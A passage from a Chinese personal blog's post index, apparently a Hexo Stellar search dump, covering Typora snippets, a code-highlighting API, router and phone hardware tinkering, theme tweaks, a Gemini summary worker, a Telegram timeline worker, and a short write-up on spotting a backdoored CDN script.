&quot;🎶&quot;, hint = &quot;插入audio音频标签&quot;, keyword = &quot;audio&quot;, callback = &quot;&#123;% audio %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📽️&quot;, hint = &quot;插入video视频标签&quot;, keyword = &quot;video&quot;, callback = &quot;&#123;% video %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🧭&quot;, hint = &quot;插入navbar导航栏标签&quot;, keyword = &quot;navbar&quot;, callback = &quot;&#123;% navbar active:/wiki/ [文章](/) [项目](/wiki/) %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📅&quot;, hint = &quot;插入timeline时间线标签&quot;, keyword = &quot;timeline&quot;, callback = &quot;&#123;% timeline %&#125; &lt;!-- node [text] --&gt; &#123;% endtimeline %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📁&quot;, hint = &quot;插入folders文件夹/折叠容器标签&quot;, keyword = &quot;folders&quot;, callback = &quot;&#123;% folders %&#125; &lt;!-- folder 题目1 --&gt; &#123;% endfolders %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;👥&quot;, hint = &quot;插入friends友链标签&quot;, keyword = &quot;friends&quot;, callback = &quot;&#123;% friends [name] %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🌐&quot;, hint = &quot;插入sites站点标签&quot;, keyword = &quot;sites&quot;, callback = &quot;&#123;% sites 分组名 %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📝&quot;, hint = &quot;插入md标签,渲染外部 markdown 文件&quot;, keyword = &quot;md&quot;, callback = &quot;&#123;% md [url] %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📚&quot;, hint = &quot;插入toc文档目录树标签&quot;, keyword = &quot;toc&quot;, callback = &quot;&#123;% toc wiki:xxx [open:true] [display:mobile] title %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📦&quot;, hint = &quot;插入box盒子容器标签&quot;, keyword = &quot;box&quot;, callback = &quot;&#123;% box [title] [color:color] [child:codeblock/tabs] %&#125; &#123;% endbox %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🔖&quot;, hint = &quot;插入tabs分栏容器标签&quot;, keyword = &quot;tabs&quot;, callback = &quot;&#123;% tabs active: align:center %&#125; &lt;!-- tab [name] --&gt; &#123;% endtabs %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🔲&quot;, hint = &quot;插入grid标签&quot;, keyword = &quot;grid&quot;, callback = &quot;&#123;% grid bg:box/card %&#125; &lt;!-- cell --&gt; &#123;% endgrid %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🖼️&quot;, hint = &quot;插入gallery图库容器标签&quot;, keyword = &quot;gallery&quot;, callback = &quot;&#123;% gallery %&#125; &#123;% endgallery %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📚&quot;, hint = &quot;插入albums专辑容器标签&quot;, keyword = &quot;albums&quot;, callback = &quot;&#123;% albums [group_id] %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🖼️&quot;, hint = &quot;插入posters海报容器标签&quot;, keyword = &quot;posters&quot;, callback = &quot;&#123;% posters [group_id] %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🖼️&quot;, hint = &quot;插入banner横幅容器标签&quot;, keyword = &quot;banner&quot;, callback = &quot;&#123;% banner [name] bg: %&#125; &#123;% endbanner %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;📸&quot;, hint = &quot;插入swiper轮播容器标签&quot;, keyword = &quot;swiper&quot;, callback = &quot;&#123;% swiper effect:cards %&#125; &#123;% endswiper %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;👤&quot;, hint = &quot;插入ghcard标签&quot;, keyword = &quot;ghcard&quot;, callback = &quot;&#123;% ghcard [name] %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🌙&quot;, hint = &quot;插入ghcard标签（暗黑主题）&quot;, keyword = &quot;ghcard-dark&quot;, callback = &quot;&#123;% ghcard [name] theme:dark %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🔐&quot;, hint = &quot;插入psw密码标签&quot;, keyword = &quot;psw&quot;, callback = &quot;&#123;% psw 密码 %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🔽&quot;, hint = &quot;插入u下划线标签&quot;, keyword = &quot;u&quot;, callback = &quot;&#123;% u 下划线 %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🔆&quot;, hint = &quot;插入emp着重号标签&quot;, keyword = &quot;emp&quot;, callback = &quot;&#123;% emp 着重号 %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🌊&quot;, hint = &quot;插入wavy波浪线标签&quot;, keyword = &quot;wavy&quot;, callback = &quot;&#123;% wavy 波浪线 %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;❌&quot;, hint = &quot;插入del删除线标签&quot;, keyword = &quot;del&quot;, callback = &quot;&#123;% del 删除线 %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🔺&quot;, hint = &quot;插入sup上角标标签&quot;, keyword = &quot;sup&quot;, callback = &quot;&#123;% sup 上角标 %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;🔻&quot;, hint = &quot;插入sub下角标标签&quot;, keyword = &quot;sub&quot;, callback = &quot;&#123;% sub 下角标 %&#125;&quot; &#125;, &#123; enable = true, type = &quot;snippet&quot;, icon = &quot;⌨️&quot;, hint = &quot;插入kbd键盘样式标签&quot;, keyword = &quot;kbd&quot;, callback = &quot;&#123;% kbd ⌘ %&#125;&quot; &#125;] Tips如有需要，可自行调整顺序 效果 更进一步 Typora Plugin远不止于此，但我不会了，研究下先，试试看能否实现以下功能： 实时渲染Stellar自有标签 表情标签支持直接从列表里选择输入 进度： 完成表情面板","tags":["Stellar","Typora"],"categories":["瞎折腾"]},{"title":"这是...动态代码框？","path":"/2024/使用pygments对代码进行高亮，并插入任意网页/","content":"前言 一直以来我都面临着一个问题：我要在文章中引用一段大几百行的代码，一眼看去md文件里5/6都是英文，要是有改动还得找到代码快开始的地方从头覆盖到尾。 前一阵子发现gist，对他的Embed爱不释手，但是我所引用的文件大部分都是在Github仓库上的，而对于普通文件并没有Embed功能。如果说直接用gist的话文件发生改动时我又要手动将更改覆盖到gist上，屮，太痛了。 思路 从解决痛点问题出发，我认为需要具备以下功能。 类似gist可以嵌入到页面中 自动同步改动 对gist提供嵌入的js分析了一下，发现它包括两部分： 插入代码区，这部分包括已进行高亮的代码 引入css 那接下来就好办了，我们只需要将文件内容获取下来，进行高亮后显示即可。 然后从网上搜了一下，能进行代码高亮的库，发现了highlight(js)以及pygments(py)。 对于纯静态博客而言，肯定是使用highlight直接在前端处理好，但是这可能产生跨域问题以及因为网络问题无法获取到文件内容。况且现在无服务器函数遍地走了，那就直接pass掉吧。翻了下pygments的文档，嗯，懂了，开整。 写code 这简单，跳过了 部署🎇 因为我是直接用Vercel的cli进行部署的，所以这一步需要先安装一下 也可以直接部署: Develop To Vercel $ 然后登录 $ 再clone下仓库到本地，你可以打开api\\main.py来修改一下/删除提供者信息 $ 如有需要，可在vercel.json里配置可信来源，防止滥用 部署到生产环境 $ 若出现Vercel报错Error: Unable to find any supported Python versions.记得把项目的node版本改成 18.x 随后引用即可 1&lt;script src=&quot;https://&#123;yourdomain&#125;/api/v1/generate?url=&#123;fileurl&#125;&amp;lang=&#123;language&#125;&quot;&gt;&lt;/script&gt; {fileurl}为所需引入文件的链接，{language}为对应语言（自动识别我试了下精准度堪忧，只好手动指定 可传入参数： 参数名 默认值 解释 code \\ 需要的高亮的代码 url \\ 需要的高亮的代码的链接 lang [为空时根据后缀名判断] 语言 withcss true 是否附带css json false 是否以json形式返回({“result”: “…”}) 扩展 更便捷的使用 受@星日语的启发，我做了个插件：hexo-dynamic-codeblock 安装：$ 配置： _config.yml12345dynamic_codeblock: loading: true showsupporter: true api: https://&#123;yourdomain&#125;/api/v1/generate css: https://jsd.hzchu.top/gh/thun888/assets@master/files/pygments-css/default.css loading只针对Stellar主题。同时，为使copycode正常工作，你需要将/js/plugins/copycode.js修改为这样 使用： 1&#123;% coding [url] [lang] %&#125; 在其它主题中的表现： landscape 从传统方式迁移： ​\t使用正则表达式，将&lt;script src=&quot;https://hightlight-code-api\\.hzchu\\.top/api/v1/generate\\?url=(.*)&amp;lang=(.*)&quot;&gt;&lt;/script&gt;替换为&#123;% coding $1 $2 %&#125; Todo [ ] 添加 /preview 效果 该处引用本程序代码 1&lt;script src=&quot;https://hightlight-code-api.hzchu.top/api/v1/generate?url=https://raw.githubusercontent.com/thun888/hightlight-code-api/main/api/main.py&amp;lang=python&quot;&gt;&lt;/script&gt; addEventListener(\"load\",function(){ console.log('[hexo-dynamic-codeblock]start load：coding-cxrr42555' ); utils.jq(() => { $(function () { const el = document.getElementById('coding-cxrr42555'); utils.request(el, \"https://hightlight-code-api.hzchu.top/api/v1/generate?url=https%3A%2F%2Fraw.githubusercontent.com%2Fthun888%2Fhightlight-code-api%2Fmain%2Fapi%2Fmain.py&lang=python&usejson=true\", function (data) { $(el).append(data.result); addCopyButtons('coding-cxrr42555'); }); }); }); });","tags":["python","Vercel"],"categories":["技术类"]},{"title":"为小米路由器加上屏幕","path":"/2024/为小米路由器加上屏幕-用小电视-SD2-监控小米路由器/","content":"前言 之前在bbs.hzchu.top写过，不过没多少人看，迁回博客里 流程 搭建MRUI 顺手集成到自己项目里了，自己用起来也方便 搭建参阅Mirouterui简要部署指南 修改部分程序代码 由于默认获取一次信息间隔太短，会对路由器造成不小的负担，最好改为5s获取一次 1705053582589.webp 同时程序不支持http0.1,要把发送请求处代码修改为http1.1 1703987881404.webp 展示 扩展 自定义显示 你可以参照下面的图片中的“传感器”名称，对代码中获取传感器数据的地方进行修改。如我就将温度改为了在线设备数 HA 同时兼容HA的netdata集成 1704075984628.webp 1704076036821.webp 示例配置： 1704076059450.webp 后记 感觉他程序有点不如人意，特别是我照着readme写完时发现用的api已经弃用了，重写完发现每秒发送5个请求直接把路由器的cpu占用干到80%+的时候 当然也有我的锅，现在调用netdata的api默认会有两秒的缓存","tags":["Mirouterui"],"categories":["技术类"]},{"title":"为小米MIX2s更换音量排线及电池的最优方法","path":"/2024/为小米MIX2s更换音量排线及电池的最优方法/","content":"前言 两三个月前吧，我发现音量下键和开关键时灵时不灵的，特别是开关键软趴趴的，时不时卡住就循环重启。直到半个月前，它终于圆满的离开了—彻底按不动了，锁屏都得下滑通知栏，点按钮才关得上。然后一寻思，反正都要拆开了，顺便换个电池吧（软件统计剩余容量2000多毫安时，待机一晚上都挺不过去） 买零件 我这里买的是中电的扩容电池，因为电池配着工具包所以音量排线买一个三块钱左右的也够了（虽然我忘了这茬 IMG_20240420_101135.webp 准备材料 热风枪 耐热垫板 镊子 若没有热风枪，可使用电吹风 零件全家福： IMG_20240419_171503.webp IMG_20240419_171523.webp 准备工作 将手机电量用尽 关机 开始 取出卡托 将手机背面朝上放置在隔热垫板上，使用热风枪来回加热尾部边缘地区我比较暴力啊直接500°C吹了40多秒，一开始用电吹风折腾了十几分钟没搞开 1713600995917.webp 放好热风枪，迅速将吸盘吸在尾部（确认吸盘完全吸附，尽量不要探到手机外部），右手食指和拇指按住手机两侧尾部（中框处），往外拉吸盘拉开缝后就容易了，用附赠的卡片卡住即可（如果来不及可以先用指甲顶上） IMG_20240419_174028.webp 在这基础上，可以尝试直接使用划开，如果不行就用拨片。如果划不动不妨翘一翘注意最好逆时针刮，毕竟指纹排线在音量键旁边 跑焦了 注意为防止摄像头进灰，最好拿胶布贴一下 打开后 IMG_20240419_174441.webp 顺便提一嘴，无线充电是放在电池上的，没有下胶水，感动~ IMG_20240419_174550.webp 拆下标记处螺丝，取下无线充&amp;NFC线圈 IMG_20240419_174614.webp IMG_20240419_174801.webp IMG_20240419_174810.webp 拆音量排线🪡 因为换音量排线要拆主板，先拆下所有排线&amp;螺丝，取出主板中间铜箔注意取下对于细微操作建议使用镊子要不你试试：事后复盘时看图片好像也不用拆主板，可以试试看 1713604675750.webp 由内向外顶出音量排线底板，取出来后将替换件的底板上的胶撕开放进去，再用螺丝刀从外向内顶一下，使底板的胶与手机充分接触将主板装回即可 IMG_20240419_182603.webp 拆电池🪄 我看中电官方的视频教程里电池胶一抽就出来了，我的可能比较腼腆啊一抽就断 那没办法了，只能上螺丝刀了 警告还记得准备工作中的放电吗，该操作100%破坏电池，若电量充足可能会造成不堪设想的后果 因为下面有排线，建议在图中圈圈处入刀，然后沿着上部分滑动，“挤开”电池 1713607423583.webp 拆下来的电池 IMG_20240419_180328.webp 随后安装新电池，因为是扩容电池的原因，排线有亿点难走，最好先大致掰一掰形状，再接上排线，最后装到电池槽内 IMG_20240419_180423.webp IMG_20240419_180512.webp 到这一步了可以试下能不能开机了，测试完成后复原所有排线，螺丝及无线充电模块 打胶🧪 先用镊子清理残胶，随后用附赠的b7000涂一圈，把后壳扣好。家里没有橡皮筋我干脆就拿手肘压了十几分钟，反正都是带手机套用的也不在意那点缝隙。 主观体验 一个字——沉。不带手机套净重219g，差不多半斤了，虽然按照百度百科的数据才重了30g 续航方面大大提升，原本要一直插着电用（防止要带着走时没电），现在电力自由了 IMG_1.webp IMG_2.webp 不足 用吸盘吸时没抓好，受力点集中在屏幕上，直接让我屏幕又碎了几条小裂纹 看到有一个教程一个劲的从里面推音量排线的底板，害得我直接把电源键上的塑料垫整掉了，费了半天劲才给他塞回去，还搞得现在还是软趴趴的手感 撬电池的时候没看见下面有排线，直接创到屏幕排线上了，幸好没有坏","tags":["DIY"],"categories":["瞎折腾"]},{"title":"主题改动小记","path":"/2024/主题改动小记/","content":"很久之前，为了在主题中新增功能还是改主题文件实现的，不过因为没有用Git进行管理，后面带来一个很严重的问题：升级十分困难。 当然，即便早已摆脱了那种想升级又不敢升级的困境，我还是不喜欢对主题进行过多的侵入式修改，在前几个月我陆陆续续将主题中一些自定义的部分阉掉或通过外部注入实现，但随之而来又有一个问题：可自定义程度低。 罢了罢了，我自己写一篇文章来记录改动吧，免得以后出现问题时不知道怎么改回来。 叠甲本文仅用作记录，不具备任何教程性质，仅供参考 非直接修改主题 杂项 包括：烟花特效，运行时间，复制提醒，超链接图标等等，以注释为准 addEventListener(\"load\",function(){ console.log('[hexo-dynamic-codeblock]start load：coding-yd3j6jbr3' ); utils.jq(() => { $(function () { const el = document.getElementById('coding-yd3j6jbr3'); utils.request(el, \"https://hightlight-code-api.hzchu.top/api/v1/generate?url=https%3A%2F%2Fraw.githubusercontent.com%2Fthun888%2Fmyblog%2Fmain%2Fsource%2Fjs%2Fextra.js&lang=js&usejson=true\", function (data) { $(el).append(data.result); addCopyButtons('coding-yd3j6jbr3'); }); }); }); }); 烟花特效&amp;运行时间来自网络 加载动画 通过injector实现 addEventListener(\"load\",function(){ console.log('[hexo-dynamic-codeblock]start load：coding-cm19rv2ej' ); utils.jq(() => { $(function () { const el = document.getElementById('coding-cm19rv2ej'); utils.request(el, \"https://hightlight-code-api.hzchu.top/api/v1/generate?url=https%3A%2F%2Fraw.githubusercontent.com%2Fthun888%2Fmyblog%2Fmain%2Fscripts%2Fheadend.js&lang=js&usejson=true\", function (data) { $(el).append(data.result); addCopyButtons('coding-cm19rv2ej'); }); }); }); }); 对应的js addEventListener(\"load\",function(){ console.log('[hexo-dynamic-codeblock]start load：coding-786c13hk0' ); utils.jq(() => { $(function () { const el = document.getElementById('coding-786c13hk0'); utils.request(el, \"https://hightlight-code-api.hzchu.top/api/v1/generate?url=https%3A%2F%2Fraw.githubusercontent.com%2Fthun888%2Fmyblog%2Fmain%2Fsource%2Fjs%2Fload.js&lang=js&usejson=true\", function (data) { $(el).append(data.result); addCopyButtons('coding-786c13hk0'); }); }); }); }); 哔哔广场 与其说是广场，不如说是个人独秀（毕竟我这也不是正经的Memos 魔改自哔哔广场-木木木木木 (immmmm.com) addEventListener(\"load\",function(){ console.log('[hexo-dynamic-codeblock]start load：coding-xesc1xp4r' ); utils.jq(() => { $(function () { const el = document.getElementById('coding-xesc1xp4r'); utils.request(el, \"https://hightlight-code-api.hzchu.top/api/v1/generate?url=https%3A%2F%2Fraw.githubusercontent.com%2Fthun888%2Fmyblog%2Fmain%2Fsource%2Fbb%2Findex.md&lang=markdown&usejson=true\", function (data) { $(el).append(data.result); addCopyButtons('coding-xesc1xp4r'); }); }); }); }); 对应的js addEventListener(\"load\",function(){ console.log('[hexo-dynamic-codeblock]start load：coding-re9e2fgcb' ); utils.jq(() => { $(function () { const el = document.getElementById('coding-re9e2fgcb'); utils.request(el, \"https://hightlight-code-api.hzchu.top/api/v1/generate?url=https%3A%2F%2Fraw.githubusercontent.com%2Fthun888%2Fmyblog%2Fmain%2Fsource%2Fjs%2Fmemos.js&lang=js&usejson=true\", function (data) { $(el).append(data.result); addCopyButtons('coding-re9e2fgcb'); }); }); }); }); 配色方案 _config.stellar.yml12345678910111213141516171819######## Article ########article: category_color: &#x27;生活小事&#x27;: &#x27;#bf9936&#x27; &#x27;技术类&#x27;: &#x27;#2196f3&#x27; &#x27;瞎折腾&#x27;: &#x27;#ef613f&#x27;style: color: # 动态颜色（会根据明暗主题重设明度值，只用关心色相和饱和度即可） background: &#x27;hsl(212 16% 98%)&#x27; # 浅色背景颜色 block: &#x27;hsl(212 8% 95%)&#x27; # 块背景颜色 code: &#x27;hsl(220 20% 10%)&#x27; # &#x27;hsl(14 100% 48%)&#x27; # 行内代码颜色 text: &#x27;hsl(0 0% 20%)&#x27; # 文本颜色 # 主题色配置（不会根据明暗动态调整，请设置为通用的颜色） # theme: &#x27;hsl(192 98% 55%)&#x27; # 主题色 theme: &#x27;hsl(88 76% 40%)&#x27; # 主题色 accent: &#x27;hsl(14 100% 57%)&#x27; # 强调色 link: &#x27;hsl(88 76% 40%)&#x27; # 超链接颜色 hover: &#x27;hsl(14 100% 57%)&#x27; # 按钮高亮颜色 超链接样式调整 文章内链接：加粗并下移下划线。 1234567/* 文章内链接：为链接使用荧光笔下划线效果 */li:not([class]) a:not([class]),p:not([class]) a:not([class]),table a:not([class]) &#123; padding-bottom: 0.1rem; background: linear-gradient(0, var(--theme-link-opa), var(--theme-link-opa)) no-repeat center bottom / 100% 40%;&#125; 直接修改主题 字数统计 themes\\stellar\\layout\\_partial\\main\\footer.ejs123456789101112...// footer el += &#x27;&lt;div class=&quot;text&quot;&gt;&#x27; if (content) &#123; el += markdown(content) &#125; el += &#x27;&lt;script&gt; var allpostscount = &quot;&#x27; + site.posts.length + &#x27;&quot; ;var allpostswords = &quot;&#x27; + totalcount(site) + &#x27;&quot;;gtime_days = Math.floor((new Date() - new Date(&#x27; + page.updated + &#x27;)) / 1000 / 60 / 60 / 24);&lt;/script&gt;&#x27; el += &#x27;&lt;/div&gt;&lt;/footer&gt;&#x27; return el &#125; %&gt; &lt;%- layoutDiv() %&gt; 将字数信息引入到变量中供调用 1&lt;span id=&quot;timeDate&quot;&gt;载入天数...&lt;/span&gt;&lt;span&gt;&amp;&lt;/span&gt;&lt;span id=&quot;times&quot;&gt;载入时分秒...&lt;/span&gt;，共发表了&lt;span id=&quot;all-posts-count&quot;&gt;load&lt;/span&gt;篇文章，总计&lt;span id=&quot;all-post-words&quot;&gt;load&lt;/span&gt;字 相关js参阅#杂项 文章内字数统计&amp;阅读时长 themes\\stellar\\layout\\_partial\\main avbar\\article_banner.ejs12345... // 3.left.bottom el += partial(&#x27;dateinfo&#x27;) //字数显示 el += &#x27;&lt;div class=&quot;flex-row&quot; id=&quot;page-words&quot;&gt;&lt;span style=&quot;padding: 4px;&quot;&gt;本文字数：&#x27; + wordcount(page.content) + &#x27;字&lt;/span&gt;&lt;span class=&quot;sep updated&quot; style=&quot;padding: 4px;&quot;&gt;&lt;/span&gt;&lt;span class=&quot;text updated&quot; style=&quot;padding: 4px;&quot;&gt;阅读时长：&#x27; + min2read(page.content) + &#x27;分&lt;/span&gt;&lt;/div&gt;&#x27;; css: source\\mcss\\mcss.css123456789.bread-nav div#page-words span.sep:before &#123; content: &#x27;|&#x27;;&#125;.bread-nav div#page-words span.updated &#123; visibility: hidden;&#125;.bread-nav:hover div#page-words span.updated &#123; visibility: visible;&#125; 文章内过期提醒 变量获取一并放在footer里了 themes\\stellar\\layout\\page.ejs1234... el += `&lt;article class=&quot;$&#123;articleClass()&#125;&quot;&gt;` //过期提醒容器 el +=`&lt;div id=&quot;gtime&quot;&gt;&lt;/div&gt;` 相关js参阅#杂项 文章内标签显示 紧跟在文章内字数统计下方 themes\\stellar\\layout\\_partial\\main avbar\\article_banner.ejs123456789101112//标签显示if (page.layout == &quot;post&quot; &amp;&amp; page.tags &amp;&amp; page.tags.length &gt; 0) &#123; el += &#x27;&lt;div class=&quot;flex-row&quot; id=&quot;tag&quot;&gt;&#x27;; // 将标签容器的创建移动到条件内部 el += &#x27; &lt;span&gt;&amp;nbsp标签：&lt;/span&gt;&#x27;; el += list_categories(page.tags, &#123; class: &quot;cap breadcrumb&quot;, show_count: false, separator: &#x27;&amp;nbsp; &#x27;, style: &quot;none&quot; &#125;); el += &#x27;&amp;nbsp&lt;/div&gt;&#x27;;&#125; 显示Artalk最近评论 addEventListener(\"load\",function(){ console.log('[hexo-dynamic-codeblock]start load：coding-yuwz45sku' ); utils.jq(() => { $(function () { const el = document.getElementById('coding-yuwz45sku'); utils.request(el, \"https://hightlight-code-api.hzchu.top/api/v1/generate?url=https%3A%2F%2Fraw.githubusercontent.com%2Fthun888%2Fhexo-theme-stellar%2Fmyself%2Fsource%2Fjs%2Fservices%2Fartalk.js&lang=js&usejson=true\", function (data) { $(el).append(data.result); addCopyButtons('coding-yuwz45sku'); }); }); }); }); 注释部分为头像获取 css: source\\mcss\\mcss.css12345678.tag-plugin.timeline .body img[atk-emoticon] &#123; max-height: 40px; display: initial; margin: 0;&#125;.tag-plugin.timeline .body img &#123; max-height: 200px;&#125; 注册为数据服务： _config.stellar.yml1234# 内置服务，按需加载（页面内用到了就会加载，没有用到就不会加载）data_services: artalk: js: /js/services/artalk.js 组件引入： source\\_data\\widgets.yml123456new_comment: layout: timeline title: 最新评论 api: https://artalk.hzchu.top/api/v2/stats/latest_comments?site_name=Thun888 # 此处为 Artalk API 地址，末尾为站点名称 type: artalk limit: 10 # 限制获取数量，默认为 10 侧边栏 stellar\\layout\\_partial\\widgets\\toc.ejs123456789101112var relativePath = page.source;&lt;!-- 编辑本页 --&gt;el += `&lt;a class=&quot;edit-btn&quot; href=&quot;https://github.com/thun888/myblog/edit/main/source/$&#123;relativePath&#125;&quot;&gt;`el += icon(&#x27;myself:edit-twotone&#x27;)el += `&lt;span&gt;$&#123;__(&#x27;btn.edit&#x27;)&#125;&lt;/span&gt;`el += `&lt;/a&gt;`&lt;!-- 删除模式 --&gt;el += `&lt;a class=&quot;delmode-btn&quot; onclick=&quot;toggleDeleteMode()&quot;&gt;`el += icon(&#x27;myself:close-circle&#x27;)el += `&lt;span&gt;$&#123;__(&#x27;btn.delmode&#x27;)&#125;&lt;/span&gt;`el += `&lt;/a&gt;` 部分用语改动 themes\\stellar\\languages\\zh-CN.yml1234meta: related_posts: 这些怎么样（￣︶￣）↗　search: search: 搜搜看","tags":["Blog"],"categories":["瞎折腾"]},{"title":"用Gemini，实现AI摘要","path":"/2024/用Gemini实现AI摘要/","content":"前言 很久之前，我网上surfing的时候发现好多网站都有「AI摘要」，了解了一下发现是「TianliGPT」，好是好，但两位数的价格还是打动不了我当时勉强三位数的存款。本着能省就省的原则，我使用了一种笨方法（为了撑场子没考虑太多），手动向「BingAI」发送摘要文本，获取摘要后存储在kv中，通过cfw返回。可行，但太痛苦了（这也是它叫DolGPT的原因之一），前几天看到Gemini开放了api可以免费调用，这不直接起飞 获取GEMINI_KEY 首先登录ai.google.dev，左上角点击Get API key，再在中间点Create API key，随便选个项目即可 没听懂就看图片吧Snipaste_2024-03-09_10-17-37.webpSnipaste_2024-03-09_10-18-14.webpSnipaste_2024-03-09_10-22-37.webpSnipaste_2024-03-09_10-23-59.webpSnipaste_2024-03-09_10-22-25.webp 后端程序 因为Stellar已经配置了TianliGPT的css了，所以我也懒得另起炉灶，直接按TianliGPT的格式返回，所以理论上讲和其它的使用TianliGPT的服务也兼容 仓库：thun888/ai-summary 新建一个Cloudflare Worker，复制/src/index.js的代码粘贴进去 随后修改环境变量，填入可信来源（即只有这个域名才能调用ai摘要，如不需要可设置为*）（ALLOWED_ORIGINS）以及你的key（GEMINI_KEY） 1709985925369.webp 接着新建一个kv，并绑定到程序上 kv的名字随意，但Variable name 必须为 KV 1709987402272.webp 最后可以尝试访问，有输出且刷新不变即为成功 1709986972903.webp 该程序只实现了ai摘要生成，对于其他网站矩阵之类的功能，其实自己用哪里要得上这么多功能嘛 前端程序修改 理论上，直接替换summary.tianli0.top为你对应域名即可，但在很多情况下，你还需要额外删减一些无关api调用，如openid生成 这是我修改后的程序，可以参考 addEventListener(\"load\",function(){ console.log('[hexo-dynamic-codeblock]start load：coding-ryg61giy1' ); utils.jq(() => { $(function () { const el = document.getElementById('coding-ryg61giy1'); utils.request(el, \"https://hightlight-code-api.hzchu.top/api/v1/generate?url=https%3A%2F%2Fraw.githubusercontent.com%2Fthun888%2Fmyblog%2Fmain%2Fsource%2Fjs%2Fchuckle-post-ai.js&lang=js&usejson=true\", function (data) { $(el).append(data.result); addCopyButtons('coding-ryg61giy1'); }); }); }); }); 修改完后引入到主题 以下为针对Stellar主题 config.yml123456789101112131415161718# AI 摘要# https://github.com/qxchuckle/Post-Summary-AItianli_gpt: enable: true js: /js/chuckle-post-ai.js #改为对应路径 field: post key: 5Q5mpqRK5DkwT1X9Gi5e total_length: 3500 typewriter: true summary_directly: true rec_method: all hide_shuttle: true summary_toggle: false interface: name: AI摘要 introduce: &#x27;我是文章辅助AI: Gemini，点击下方的按钮，让我生成本文简介、推荐相关文章等。&#x27; version: Gemini button: [&quot;介绍自己&quot;, &quot;推荐文章&quot;, &quot;生成摘要&quot;, &quot;矩阵穿梭&quot;] 如果无效可以自己在\\stellar\\layout\\_partial\\plugins\\tianli_gpt.ejs里修改 效果演示 1712297627948.webp 结语 其表现我个人感觉跌宕起伏，有时不如ChatGPT，有时有吊打Bing，反正免费的要什么自行车 记得之前看还叫Bard，还不支持中文，没想到现在这么厉害了","tags":["Blog","Stellar","CFW"],"categories":["技术类"]},{"title":"记一次排查js文件后门","path":"/2024/记一次排查js文件后门/","content":"起因 今天调试博客时猛地发现电脑卡的不像样，排除后发现是控制台的问题，再一看控制台里全是网络请求，这可不是好事啊 Snipaste_2024-03-08_20-40-38.webp 过程 起初，因为我回档了所有更改依然有这种情况，我猜是浏览器插件问题，但关闭了所有插件后依然如此 然后，我查看了异常js引入的时间点，并往上挨个检查 Snipaste_2024-03-08_20-37-33.webp 最初的异常引入在sdk.html，随后在js文件里依次搜索，最后定位到lazyload.min.js Snipaste_2024-03-08_20-37-04.webp 但是嘛，当我在新标签页里打开时，显示的又是正常的js，对比发现请求ip不同，在改hosts后成功获取到带后门的js文件 不正常的Snipaste_2024-03-08_20-39-35.webp 正常的Snipaste_2024-03-08_20-39-25.webp Snipaste_2024-03-08_20-42-50.webp 解决方法 将https://cdn.bootcdn.net/ajax/libs全部替换为https://cdn.staticfile.net Snipaste_2024-03-08_20-48-17.webp","tags":["Blog"]},{"title":"把Tg Channel接入到Stellar时间线","path":"/2024/把Tg-Channel接入到Stellar时间线/","content":"前言 之前调CW时发现Cyan加上了TG频道说说，因为已经有Memos了所以没有在意，昨天在Stellar 探索号看到有stellar主题集成Telegram Channel说说的教程，忽然灵光一闪，这拿来放草稿/想法挺合适的嘛 正文 首先新建一个频道，并记下频道ID 1708839745065.webp 新建一个Cloudflare Worker，复制下面的代码粘贴进去 为了兼容Stellar的时间线，我在lvbyte的基础上改了点代码 并修改顶部配置 123const ChannelNameList = [&#x27;thun888sthinks&#x27;]; //频道ID，可添加多个const deniedRegion = [&quot;&quot;]; 屏蔽区域，如CN,USconst baseproxyurl=&quot;https://get-tg-channel-api.hzchu.top/?proxy=&quot; //将中间域名替换为你为worker绑定的域名 随后按照使用Memos时间线形式使用即可 可传入参数 参数 参数名 默认值 描述 cid 频道id 0 指在代码里配置的第n个频道，并不是上文所述频道id mid 信息id / 指定后只返回该信息，信息id可在发送后查看 tag 标签名 DefaultTag 筛选传入的标签返回 limit 获取条数 / / offset 获取信息偏移量 / 如果有一条信息id为80的信息，那么当传入80时将返回这条信息之前的所有信息 showtag 是否展示标签 true / showview 是否展示访问量 false 启用时会在末尾附上(views:number) usemd 是否使用Markdown true 开启后返回未被tg解析过的md语法 usetgclassification 是否使用tg自带的分类 false 开启后使用tg自带的分类来进行标签筛选，防止过久导致无法显示。但注意会有缓存 众所周知，0是第一个自然数，所以cid传入0时表示获取第1个频道 tag为空时默认返回#DefaultTag的数据，可在代码中自行更改 tag原版是#SFCN,一开始没想明白是什么意思，现在明白了：Suitable For China，可以有别的玩法o(￣▽￣)ｄ 在Stellar中的使用 在独立页面内使用添加为小部件进阶（使用数据服务插件） 代码：123&#123;% timeline user:thun888sthinks api:https://get-tg-channel-api.hzchu.top/?cid=1&amp;tag=DTA&amp;limit=3 type:memos 